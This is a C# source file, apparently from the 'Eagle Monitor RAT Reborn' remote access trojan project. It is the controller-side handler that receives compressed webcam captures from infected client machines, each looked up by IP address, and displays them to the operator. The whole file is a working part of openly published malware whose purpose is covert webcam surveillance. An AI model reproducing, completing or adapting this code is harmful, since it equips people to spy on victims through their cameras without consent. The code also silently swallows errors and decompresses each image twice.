using Eagle_Monitor_RAT_Reborn.Network;
using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.PacketHandler
{
    internal class RemoteCameraCapturePacketHandler
    {
        public RemoteCameraCapturePacketHandler(RemoteCameraCapturePacket remoteCameraCapturePacket) : base()//, ClientHandler clientHandler)
        {
            if (ClientHandler.ClientHandlersList[remoteCameraCapturePacket.BaseIp].ClientForm != null)
            {
                try
                {
                    ClientHandler.ClientHandlersList[remoteCameraCapturePacket.BaseIp].ClientForm.remoteWebCamPictureBox.BeginInvoke((MethodInvoker)(() =>
                    {
                        ClientHandler.ClientHandlersList[remoteCameraCapturePacket.BaseIp].ClientForm.RemoteWebCamHandler.HasAlreadyConnected = true;
                        if (ImageProcessing.BytesToImage(Compressor.QuickLZ.Decompress(remoteCameraCapturePacket.cameraCapture)) != null)
                            ClientHandler.ClientHandlersList[remoteCameraCapturePacket.BaseIp].ClientForm.remoteWebCamPictureBox.Image = ImageProcessing.BytesToImage(Compressor.QuickLZ.Decompress(remoteCameraCapturePacket.cameraCapture));
                    }));
                    return;
                }
                catch { }
            }
        }
    }
}
